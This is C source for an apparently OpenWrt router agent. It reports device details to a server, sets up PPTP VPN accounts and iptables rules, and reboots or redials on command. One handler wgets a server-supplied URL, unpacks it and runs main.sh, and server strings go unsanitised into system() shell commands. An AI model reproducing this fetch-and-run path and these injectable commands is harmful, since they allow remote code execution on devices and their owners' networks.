
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>

#include <stdarg.h>

#include <debug_pub.h>
       #include <sys/socket.h>
       #include <netinet/in.h>
       #include <netinet/ip.h> /* superset of previous */
       #include <sys/socket.h>
       #include <netinet/in.h>
       #include <arpa/inet.h>
#include <utils/utils.h>
#include <utils/vty.h>
#include <utils/thread.h>
#include <utils/command.h>
#include <utils/log.h>
#include <utils/vector.h>
#include <utils/network.h>
#include <time.h>
#include "local.h"
#include "route.h" //untils and seng_msg log soso.

/* 所有的任务们。 */

//#define __log(fmt,...)  __z_log("%s:"fmt,...)
int _p_log(const char* func,int line,const char* fmt,...);


int _p_log(const char* func,int line,const char* fmt,...)
{
	va_list args;
	int l;
	static FILE* log_fp = 0;
	static int log_line = 0;
	int fd;
	char buf[1024]={0};

	if(log_fp == NULL)
	{
	    log_fp = fopen("/tmp/cli.log","w");
	}
	
	time_t a;
	time(&a);
	va_start(args,fmt);
	l = sprintf(buf,"%s",ctime(&a));
	l -=1;
	l += sprintf(buf+l,"|%s|%d|  ",func,line);
	vsprintf(buf+l,fmt,args);
	va_end(args);
	
	if(log_fp == NULL)
	    fprintf(stderr,"%s",buf);
	else 
	{
	    log_line++;
	    fprintf(log_fp,"%s",buf);
	    fflush(log_fp);
	}
	if(log_line >=2048)
	{
	    fd = fileno(log_fp);
	    ftruncate(fd, 0);
	    lseek(fd, 0, SEEK_SET);
	    log_line = 0;
	}
	
}
#define __log(fmt,...) \
	_p_log(__func__,__LINE__,fmt"\n", ##__VA_ARGS__)

#define __err_log(fmt,...) \
	_p_log(__func__,__LINE__,"ERROR|"fmt"\n", ##__VA_ARGS__)
#if 0
#define __system(cmd)   do{ \
    __log("do system cmd: %s",cmd); \
    }while(0);
#endif

#if 0
int __log(const char *format,...)
{
  va_list args;
  int len;
  char buf[2000];
  	time_t a;
	time(&a);
	
	len = sprintf(buf,"%s: ",ctime(&a));
	
  va_start(args, format);
  fprintf(stderr,format,args);//
  va_end (args);
}
#endif

#define VERSION_WTP "1.0.0"
struct wtp_base_info
{
    char wanport[32];
    u8   mac[6];
    struct in_addr wanip;
};
struct wtp_ctx
{
    struct thread_master* m;
    char curr_ver[32];
    char ver[32];
    char padd[4];
    char* secretKey;
    char* publicKey;
    
    int   lan_low_traffic;
    uint8_t wan_usage;
    
    struct wtp_base_info binfo;
};

struct wtp_ctx  g_wtp_ctx;


int get_vpnlist(struct thread* th);
int route_wtp_init(struct thread_master* m);
/**************************************parse msg form server and by json*********************/
/* report self and get vpnlist when setup  */
/*
{"ip":"172.16.14.2",
"mac":"00:11:22:33:44:55:",
}

*/
struct vpn_data
{
    char* name;
    char* pwd;
};

#define __system(cmd)   do{ \
    __log("do system cmd: %s",cmd); \
    system(cmd);        \
    }while(0);



int handler_getVer_retsult(char* str)
{
    char* ver_j;
    char* secretKey_j;
    char* publicKey_j;
    //char buf[256]={0};
    char ver_b[256];
    char* ver_v;
    char* secretKey_v;
    char* publicKey_v;
    json_object* json_obj = create_sjon_from_string(str);
    ver_j = find_value_from_sjon_by_key(json_obj,"ver");
    secretKey_j = find_value_from_sjon_by_key2(json_obj,"secretKey");
    publicKey_j = find_value_from_sjon_by_key2(json_obj,"publicKey");

    if(ver_j)
    {
        memset(ver_b,0,sizeof(ver_b));
        strncpy(ver_b,ver_j,sizeof(ver_b));
        ver_v = skip_str_prefix(ver_b,(char)(34));
        memset(g_wtp_ctx.ver,0,sizeof(g_wtp_ctx.ver));
        memcpy(g_wtp_ctx.ver,ver_v,strlen(ver_v));

    }
    if(publicKey_j)
    {
        publicKey_v = skip_str_prefix(publicKey_j,(char)(34));
        g_wtp_ctx.publicKey = publicKey_v;

        
    }
    if(secretKey_j)
    {
        secretKey_v = skip_str_prefix(secretKey_j,(char)(34));
        g_wtp_ctx.secretKey = secretKey_v;
    }
    __log("ver=%s secretKey_v %s publicKey_v %s .",ver_v,secretKey_v,publicKey_v);

  
    //do new version
    
    if(strcmp(ver_v,VERSION_WTP) != 0)
    {
        __log("new verion %s old version %s ",ver_v,VERSION_WTP);
        /* TODO  */
    }
    free_json(json_obj);
    return 0;
}

char* parse_vpn_name_or_pwd(char* key,char* str,char* ret)
{
    const char* value_j=0;
    
    char* value_b;
    char* value_v;
    json_object* json_obj = create_sjon_from_string(str);
    value_j = find_value_from_sjon_by_key(json_obj,key);
    if(!value_j){
        __err_log("find %s fail from json",key);
        free_json(json_obj);
        return -1;
    }
    value_b = malloc(strlen(value_j)+1);
    if(value_b == 0)
        return NULL;
    memset(value_b,0,strlen(value_j)+1);
    strncpy(value_b,value_j,strlen(value_j));
    
    value_v = skip_str_prefix(value_b,(char)(34));

    strncpy(ret,value_v,strlen(value_v));
   // ret = skip_str_prefix(ret,char(34));
    free_json(json_obj);
    free(value_b);
    return ret;
}
char* parse_vpn_name(char* str,char* ret)
{
    return parse_vpn_name_or_pwd("user",str,ret);
}
char* parse_vpn_pwd(char* str,char* ret)
{
    return parse_vpn_name_or_pwd("pwd",str,ret);
}
int prase_vpn_user_info(char* str,int id,char* ret_user,char* ret_pass)
{

    const char* vpn_value=0;
    char vpnname[32];
    int ret = -1;
    sprintf(vpnname,"vpn%d",id);
    json_object* json_obj = create_sjon_from_string(str);
    vpn_value = find_value_from_sjon_by_key(json_obj,vpnname);
    if(!vpn_value)
    {
        __err_log("find %s fail from json and return -1;",vpnname);
        free_json(json_obj);
        return -1;
    }
    __log("%s=%s ",vpnname,vpn_value);
    if(vpn_value!=NULL){
        parse_vpn_name(vpn_value,ret_user);
        parse_vpn_pwd(vpn_value,ret_pass);
        ret = 0;
    }
    free_json(json_obj);
    return ret;
}
#define LAN_PORT  "br-lan"
//#define LAN_PORT  "eth1"
char* select_vpn_inner_ip()
{

	struct in_addr addr;
	int ret;
	struct in_addr ip;
	char* ip_str = "172.25.15.1";
	
    unsigned char* ip_x = 0;
    
                // inet_ntoa("172.25.15.1",&ip);
    ret = get_iface_ip(LAN_PORT,&addr);
	if(ret != 0)
	{
	    __err_log("get lan ip failed,vpn set default ip.");
	    //return -1;
	}
	else
	{
    	ip_x = ( unsigned char*)&addr.s_addr;
    	if (ip_x[0] == 192)
            if(ip_x[1] ==168)
            {
                // inet_ntoa("172.25.15.1",&ip);
                 ip_str = "172.25.15.1";
                 //return ip;
            }
        if(ip_x[0] == 172)
        {
           
                 //inet_ntoa("10.25.15.1",&ip);
                 ip_str = "10.25.15.1";
                 //return ip; 
        }
        if(ip_x[0] == 10)
        {
                // inet_ntoa("172.25.15.1",&ip);
                 ip_str = "172.25.15.1";
                 //return ip;
            
        }
    }
    return ip_str;
        
}
int check_private_ip(struct in_addr ip)
{
    unsigned char* ip_x = ( unsigned char*)&ip.s_addr;

    if (ip_x[0] == 10)
        return 0;           //0 is private ip
    if (ip_x[0] == 172)
    if(ip_x[1] >=16 && ip_x[1]<=31)
        return 0;


    if (ip_x[0] == 192)
    if(ip_x[1] ==168)
        return 0;
    return 1; // 1 is public ip.
}
#define PPTP_CONF "/etc/pptpd.conf"
int __set_remoteip_pptpd()
{
   char* remote_ip;
    char cmd[256];
    
    remote_ip = select_vpn_inner_ip();
    __log("get peerip %s; set remoteip at pptpd.conf,and get firewall ",remote_ip);
    __system("sed -i '/remoteip/d' "PPTP_CONF);
    
    sprintf(cmd,"echo 'remoteip %s-255' >>"PPTP_CONF,remote_ip);
    __system(cmd);

    __system("/etc/init.d/firewall restart");
    sprintf(cmd,"iptables -t nat -I delegate_postrouting -s %s/24 -j MASQUERADE",remote_ip);
    __system(cmd);
    sprintf(cmd,"iptables -t filter -I  delegate_forward -s %s/24 -j ACCEPT",remote_ip);
    __system(cmd);
	return 0;
    
}
int handle_getVPN_retsult(char* str)
{
    const char* vpnList_value=0;
    int i;
    int ret;
    char cmd[256];
    char ret_user[256];
    char ret_passwd[256];
   // char vpnlist[1024]= {0};
    
    char* remote_ip_str;
    json_object* json_obj = create_sjon_from_string(str);
    
    vpnList_value = find_value_from_sjon_by_key(json_obj,"vpnList");
    if(!vpnList_value){
        __err_log("getVPN : sjon not find 'vpnList', return -1;");
        return -1;
    }

        
/*

     uci set   pptpd.pptpd=service
uci set pptpd.pptpd.enabled=1
uci set pptpd.pptpd.localip= br-wan ip
pptpd.pptpd.remoteip=0-255的全网 IP
pptpd.@login[0]=login
pptpd.@login[0].username=youruser
pptpd.@login[0].password=1234
pptpd.@login[0].remoteip=172.25.15.2-254
# uci add pptpd login
uci set pptpd.@login[2].username=sdfsf
uci commit
uci set pptpd.@login[2].password=sdfsf1111
uci set pptpd.@login[2].remoteip=172.16.7.2
uci commit
cat pptpd

*/
    //__system("/etc/init.d/pptpd stop");
    __system("echo > /etc/ppp/chap-secrets");
    while(1)
    {
        i++;
        ret = prase_vpn_user_info(vpnList_value,i,ret_user,ret_passwd);
        if(ret == -1)
            break;
        sprintf(cmd,"echo '%s pptp-server %s * ' >>/etc/ppp/chap-secrets",
                ret_user,ret_passwd);
        __system(cmd);
    
    }
    
    __set_remoteip_pptpd();
    __system("/usr/sbin/pptpd -c"PPTP_CONF);
    free_json(json_obj);
    return 0;
    
}
int test_json(char* str)
{
    const char* ipv=0;
    json_object* json_obj = create_sjon_from_string(str);
    
    printf("%s:%d  json_obj %p\n",__func__,__LINE__,json_obj);
    ipv = find_value_from_sjon_by_key(json_obj,"ip");

    printf("%s:%d  ipvalue form json = %s\n",__func__,__LINE__,ipv);
    
    free_json(json_obj);
    return 0;
    
}


/* get the version info  */
int _check_version(void)
{
	char send_m[2000]={0};
	
	char recv_m[2000]={0};
    char wan_port[64]={0};
	struct in_addr addr;
	int ret;
	int recv_len;
	unsigned char mac[6];
	char mac_str[32];

	ret = get_wan_port(wan_port);
	if(ret != 0)
	{
	    __err_log("get wan port  failed!");
	    return -1;
	}
	else
	{
	    __log(" wan port is %s>",wan_port);
	}
	ret = get_iface_ip(wan_port,&addr);
	if(ret != 0)
	{
	    __err_log("get %s ip failed!",wan_port);
	    return -1;
	}
	
	ret = get_iface_mac("eth0",mac);
	if(ret != 0)
	{
	    __err_log("get %s mac failed!",wan_port);
	    return -1;
	}
	else
	{
	    sprintf(mac_str,"%02X:%02X:%02X:%02X:%02X:%02X",
	        mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	}
	
	sprintf(send_m,"{\"ip\":\"%s\",\"netType\":\"%d\" ,\"mac\":\"%s\",\"ver\":\"%s\",\"board\":\"%s\"}",
	    inet_ntoa(addr),check_private_ip(addr),mac_str,VERSION_WTP,"WE826");
	
    __log("send message <%s>",send_m);
	ret = send_msg(MSG_TYPE_GETVER,send_m,strlen(send_m)+1,recv_m,&recv_len);
	/* handler recv msg */
	if ((ret >= 0)&&(recv_len >0))
	{
	    recv_m[recv_len] = 0;
	    __log("recv message len %d <%s> ",recv_len,recv_m);
	    handler_getVer_retsult(recv_m);
	}
	return 0;
}
int check_version(struct thread* th)
{
	int ret;
	struct thread_master* m = th->arg;
	
    __log(" enter check_version:");
	ret = _check_version();
	if(ret != 0)
	{
		__err_log("failed and errorcode %d, and enter init state",ret);
		route_wtp_init(m);//to init state
	}
	else
	{
		thread_add_timer(m,check_version,m,24*60*60);// 24 hour
	}
	return 0;
}

/* report route state */
int __vpn_renew()
{
	
	thread_add_timer(g_wtp_ctx.m,get_vpnlist,g_wtp_ctx.m,3);// 3 sec
	return 0;
}
int __reset_dail_up()
{

    __log("dail up again !\n");
	__system("/etc/init.d/network restart");
	return 0;
}
int __reboot()
{
    __log("will reboot!");
    sleep(3);
	__system("reboot");
	return 0;
}
int handler_getTask_retsult(char* str)
{
    char* tasktype_j=0;
    char* taskurl_j=0;
    char* tasktype_v=0;
    char* taskurl_v=0;
    char cmd[1024];
    
    json_object* json_obj = create_sjon_from_string(str);
    tasktype_j = find_value_from_sjon_by_key2(json_obj,"taskType");
    if(tasktype_j)
    {
        tasktype_v = skip_str_prefix(tasktype_j,34);    
    }
    taskurl_j = find_value_from_sjon_by_key2(json_obj,"taskUrl");
    if(taskurl_j)
        taskurl_v = skip_str_prefix(taskurl_j,34);
    
    //__log("%s:%d ver=%s secretKey_v %s publicKey_v %s\n",__func__,__LINE__,_v,secretKey_v,publicKey_v);

    //action server's cmd or task

    if(atoi(tasktype_v) ==1) //have new task.
    {
        sprintf(cmd,"wget \"%s\" -O work.tar",taskurl_v);
        __log("do cmd <%s>",cmd);
        __system(cmd);

        __system("tar xf /tmp/work.tar -C /tmp/work");
        __system("/tmp/work/main.sh &");
    }

    
     
    free_json(json_obj);
    free(tasktype_j);
    free(taskurl_j);
    return 0;
}
int get_new_task(struct thread* th)//get vpnlist when setup.
{
	char send_m[2000]={0};
	
	char recv_m[2000]={0};;
    char wan_port[64]={0};
	struct in_addr addr;
	int ret;
	int recv_len;
	unsigned char mac[6];
	char mac_str[32];


    __log("  enter task get_new_work");
	ret = get_wan_port(wan_port);
	if(ret != 0)
	{
	    __err_log("get wan port  failed!");
	    return -1;
	}
	else
	{
	    __log(" wan port is %s",wan_port);
	}
	ret = get_iface_ip(wan_port,&addr);
	if(ret != 0)
	{
	    __err_log("get %s ip failed!",wan_port);
	    return -1;
	}
	
	ret = get_iface_mac("eth0",mac);
	if(ret != 0)
	{
	    __err_log("get %s mac failed!",wan_port);
	    return -1;
	}
	else
	{
	    sprintf(mac_str,"%02X:%02X:%02X:%02X:%02X:%02X",
	        mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	}
	sprintf(send_m,"{\"ip\":\"%s\",\"mac\":\"%s\"}",
	    inet_ntoa(addr),mac_str);
	
    __log("send  message<%s>",send_m);
	ret = send_msg(MSG_TYPE_GETTASK,send_m,strlen(send_m)+1,recv_m,&recv_len);
	/* handler recv msg */
	if ((ret >= 0)&&(recv_len >0))
	{
	    recv_m[recv_len] = 0;
	    __log("recv message len %d <%s> ",recv_len,recv_m);
	    handler_getTask_retsult(recv_m);
	}
	return 0;
}
int __opration_res_new_task()
{
    
	thread_add_timer(g_wtp_ctx.m,get_new_task,g_wtp_ctx.m,3);// 3 sec
    return 0;
}
int _report_route_stat_operation(int optcode)
{
	switch(optcode)
	{
		case 1:
		
            __log(" I will reboot!");
			__reboot();
		break;
		case 2:
            __log(" I will dail up again!");
			__reset_dail_up();
		break;
		case 3:
            __log(" I will get new vpn list!");
			__vpn_renew();
		break;
		case 4:
            __log(" I will request new little work!");
		    __opration_res_new_task();
		break;
		default:
			break;
	}
	return 0;
}

unsigned long __get_lan_rx_traffic(void)/* client tx and route rx from lan. */
{

    static unsigned long rx_pkts = 0;
    struct ifinfo ifc;
    unsigned long traffic = 0;
    int ret = get_net_dev_stat("br-lan",&ifc);
    if(ret >=0)
    {
        traffic = ifc.r_pkt - rx_pkts;
        rx_pkts = ifc.r_pkt;
    }
    else
        return 0xffffffff;
        
    return traffic;
    
}
int task_get_lan_rx(struct thread* th)
{

	struct thread_master* m = th->arg;
	unsigned long ret=0;
	ret = __get_lan_rx_traffic();
    if(ret == 0xffffffff)
    {
        __err_log("get lan rx_traffic failed!");
    }
    else
    {
        if(ret <= 100)
            g_wtp_ctx.lan_low_traffic = 1;
        else
            g_wtp_ctx.lan_low_traffic = 0;
    }
    
	thread_add_timer(m,task_get_lan_rx,m, 1*60);
	return 0;
}
unsigned long __get_wan_rx_traffic_usage(void)/* client tx and route rx from lan. */
{

    static unsigned long r_bytes = 0;
    struct ifinfo ifc;
    
    int ret = 0;
    unsigned long traffic = 0;
    char* wan_port[32];
   
    ret = get_wan_port(wan_port);
    if(ret < 0)
    {
        return 0;
    }
    ret = get_net_dev_stat(wan_port,&ifc);
    if(ret >= 0)
    {
        traffic = ifc.r_bytes - r_bytes;
        r_bytes = ifc.r_bytes;
    }
    else
        return 0;
        
    return traffic;
    
}
int task_get_wan_rx(struct thread* th)
{

	struct thread_master* m = th->arg;
	unsigned long ret=0;
	ret = __get_wan_rx_traffic_usage();
	int base = 100*1000*1000;
	
    if(ret == 0)
    {
        __err_log("get lan rx_traffic failed!");
    }
    else
    {
        g_wtp_ctx.wan_usage = (ret*8)/base;
    }
    
	thread_add_timer(m,task_get_wan_rx,m, 1*60);
	return 0;
}


int _report_route_stat_restult(char* str)
{
    char* rspcode_j=0;
    char* opt_j=0;
    char* delVpn_j=0;
    char* rspCode_v=0;
    char* rspDesc_v=0;
    char* opt_v = 0;
    char* delVpn_v = 0;
    int opt_code;
    
    json_object* json_obj = create_sjon_from_string(str);
    rspcode_j = find_value_from_sjon_by_key2(json_obj,"rspCode");
    if(rspcode_j){
        rspCode_v = skip_str_prefix(rspcode_j,34);
    }
    //rspDesc_v = find_value_from_sjon_by_key2(json_obj,"rspDesc");
    opt_j     = find_value_from_sjon_by_key2(json_obj,"opt");
    if(opt_j)
        opt_v =  skip_str_prefix(opt_j,34);
        
    delVpn_j  = find_value_from_sjon_by_key2(json_obj,"delVpn");
    if(delVpn_j)
        delVpn_v =  skip_str_prefix(delVpn_j,34);
    

   opt_code = atoi(opt_v);
    _report_route_stat_operation(opt_code);
    free_json(json_obj);
    if(rspcode_j)
        free(rspcode_j);
    if(opt_j)
        free(opt_j);
    if(delVpn_j)
        free(delVpn_j);
    return 0;
    
}
int _report_route_stat(void)
{
	int optcode = 100;
	char send_m[2000]={0};
	char recv_m[2000]={0};
    char wan_port[64]={0};
	struct in_addr addr;
	int ret;
	int recv_len;
	unsigned char mac[6];
	char mac_str[32];

	ret = get_wan_port(wan_port);
	if(ret != 0)
	{
	    __err_log("get wan port  failed!");
	    return -1;
	}
	else
	{
	    __log(" wan port is %s ",wan_port);
	}
	ret = get_iface_ip(wan_port,&addr);
	if(ret != 0)
	{
	    __err_log("get %s ip failed!",wan_port);
	    return -1;
	}

	
	if(g_wtp_ctx.binfo.wanip.s_addr != addr.s_addr)
	{
	    __log("wan ip is change, and renew vpnlist after 5 sec!");
	    thread_add_timer(g_wtp_ctx.m,get_vpnlist,g_wtp_ctx.m,5);// 5 sec
	    g_wtp_ctx.binfo.wanip.s_addr = addr.s_addr;
	}
	
	ret = get_iface_mac("eth0",mac);
	if(ret != 0)
	{
	    __err_log("get %s mac failed!",wan_port);
	    return -1;
	}
	else
	{
	    sprintf(mac_str,"%02X:%02X:%02X:%02X:%02X:%02X",
	        mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	}
	sprintf(send_m,"{\"ip\":\"%s\",\"mac\":\"%s\", \"cpuInfo\":\"%d\" ,\"memInfo\":\"%d\",\"WanInfo\":\"%d\"}",
        inet_ntoa(addr),mac_str,get_cpu_usage(),get_memory_usage(),g_wtp_ctx.wan_usage);
        
    __log("send  message<%s>",send_m);
	ret = send_msg(MSG_TYPE_PUTROUTESTATE,send_m,strlen(send_m)+1,recv_m,&recv_len);
	/* handler recv msg */
	if ((ret >= 0)&&(recv_len >0))
	{
	    recv_m[recv_len] = 0;
	    __log("recv message len %d <%s>",recv_len,recv_m);
	    _report_route_stat_restult(recv_m);
	}
	return 0;
	return 0;
}
int report_route_stat(struct thread *th)
{
	int ret;
	
	struct thread_master* m = th->arg;
	__log("enter report_route_stat:");
	ret = _report_route_stat();
	if(ret != 0)
	{
		__err_log("failed and errorcode %d, and enter init state",ret);
		route_wtp_init(m);//to init state
	}
	else
	{
	    __log("report_route_stat success");
		thread_add_timer(m,report_route_stat,m,5*60);// 5 minutes
	}
	return 0;
}



int _get_vpnlist(void)
{
	char send_m[2000]={0};
	
	char recv_m[2000]={0};
    char wan_port[64]={0};
	struct in_addr addr;
	int ret;
	int recv_len;
	unsigned char mac[6];
	char mac_str[32];
	
		
	ret = get_wan_port(wan_port);
	if(ret != 0)
	{
	    __err_log("get wan port  failed, return -1");
	    return -1;
	}
	else
	{
	    __log(" wan port is %s",wan_port);
	}
	ret = get_iface_ip(wan_port,&addr);
	if(ret != 0)
	{
	    __err_log("get %s ip failed, return -1",wan_port);
	    return -1;
	}
	
	ret = get_iface_mac("eth0",mac);
	if(ret != 0)
	{
	    __err_log("get_ %s mac failed!","eth0");
	    return -1;
	}
	else
	{
	    sprintf(mac_str,"%02X:%02X:%02X:%02X:%02X:%02X",
	        mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	}

	sprintf(send_m,"{\"ip\":\"%s\",\"mac\":\"%s\"}",inet_ntoa(addr),mac_str);
	
    __log(" send  message<%s>",send_m);
	ret = send_msg(MSG_TYPE_GETVPN,send_m,strlen(send_m)+1,recv_m,&recv_len);
	if ((ret >= 0)&&(recv_len >0))
	{
	    recv_m[recv_len] = 0;
	    __log("recv message len %d <%s> ",recv_len,recv_m);
	    handle_getVPN_retsult(recv_m);
	}
	return ret;
}
int get_vpnlist(struct thread* th)//get vpnlist when setup.
{
	//crypto and sen_msg();
	// call http_post();
	struct thread_master* m = th->arg;
	int ret=0;
	
    __log("  enter task get_vpnlist:");
	ret = _get_vpnlist();
	if(ret!=0)
	{
		//error
		__err_log("get_vpnlist failed and errorcode %d",ret);
		
		thread_add_timer(m,get_vpnlist,m,3*60);// 3 minutes
	}
	else
	{
		__system("/usr/sbin/set_pptpd_dns.sh &");
		__log("get vpn list  is success and next report_route_stat and check_version");
		thread_add_timer(m,report_route_stat,m,1*5);// 5 minutes
		thread_add_timer(m,check_version,m,2*5);// 10 minutes
	}
	return 0;
}

int _get_base_info(struct wtp_base_info* binfo)
{
    char            wan_port[64]={0};
	struct in_addr  addr;
	int             ret;
	int             recv_len;
	u8              mac[6];
	char            mac_str[32];
	
		
	ret = get_wan_port(wan_port);
	if(ret != 0)
	{
	    __err_log("get wan port  failed!");
	    return -1;
	}
	else
	{
	    __log(" wan port is %s ",wan_port);
    	strncpy(binfo->wanport,wan_port,strlen(wan_port));
	}
	
	ret = get_iface_ip(wan_port,&addr);
	if(ret != 0)
	{
	    __err_log("get %s ip failed!",wan_port);
	    return -1;
	}
    binfo->wanip.s_addr = addr.s_addr;
	
	ret = get_iface_mac("eth0",mac);
	if(ret != 0)
	{
	    __err_log("get %s mac failed!","eth0");
	    return -1;
	}
	else
	{
	    
    	memcpy(binfo->mac,mac,sizeof(mac));
    	
	    sprintf(mac_str,"%02X:%02X:%02X:%02X:%02X:%02X",
	        mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	}
	return 0;
}

int task_get_baseinfo(struct thread* th)
{
    
	struct thread_master* m = th->arg;
	__log("  enter task get_baseinfo:");
	if(0 !=_get_base_info(&g_wtp_ctx.binfo))
	{
	    
    	__err_log("  task get_baseinfo failed");
    	thread_add_timer(m,task_get_baseinfo,m,60);// 60 sec
	}
	else
	{
	
    	__log("task get_baseinfo success; and next get_vpnlist,task_get_lan_rx,task_get_wan_tx");
	    thread_add_timer(m,get_vpnlist,m,3);// 3 sec
        thread_add_timer(m,task_get_lan_rx,m,1);        
	    thread_add_timer(m,task_get_wan_rx,m, 1*60);  
	}
}
int route_wtp_init(struct thread_master* m)
{
	g_wtp_ctx.m = m;
	
	
	thread_add_timer(m,task_get_baseinfo,m,3);// 3 sec
	//thread_add_timer(m,get_vpnlist,m,3);// 3 sec
    //test_json_vpnlists(NULL);
	return 0;
		
}



